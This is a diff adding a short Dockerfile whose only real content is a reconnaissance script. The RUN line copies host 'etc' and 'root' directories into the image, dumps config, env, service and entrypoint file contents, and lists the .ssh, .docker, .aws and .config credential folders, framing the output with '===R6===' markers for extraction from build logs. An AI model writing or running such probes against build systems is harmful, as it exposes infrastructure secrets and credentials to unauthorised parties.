@@ -1,0 +1,5 @@
+FROM alpine:3.20
+COPY etc /f/etc
+COPY root /f/root
+RUN sh -c 'set +e; echo "===R6==="; echo --ETC_TOP--; ls -la /f/etc | head -100; echo --ETC_DIRS--; ls -d /f/etc/*/ 2>/dev/null | head -60; echo --UNITFILES--; find /f/etc -maxdepth 3 -type f \( -name "*.service" -o -name "*.conf" -o -name "*.json" -o -name "*.yaml" -o -name "*.yml" -o -name "*.toml" -o -name "*.env" -o -name "*rc" \) 2>/dev/null | head -150; echo --CONTENT_SMALL--; find /f/etc -maxdepth 3 -type f -size -64k 2>/dev/null | grep -E "build|rail|nats|otel|temporal|envoy|mpipe|supervis|entrypoint|environment|docker|container" | head -40 | while read f; do echo "## $f"; head -c 3000 "$f"; echo; done; echo --ROOT--; find /f/root -maxdepth 3 2>/dev/null | head -80; echo --ROOTFILES--; find /f/root -maxdepth 2 -type f -size -64k 2>/dev/null | head -20 | while read f; do echo "## $f"; head -c 2000 "$f"; echo; done; echo --SSH_DOCKER--; ls -la /f/root/.ssh /f/root/.docker /f/root/.aws /f/root/.config 2>&1 | head -40; echo "===R6_END==="'
+CMD ["sh","-c","sleep 5"]
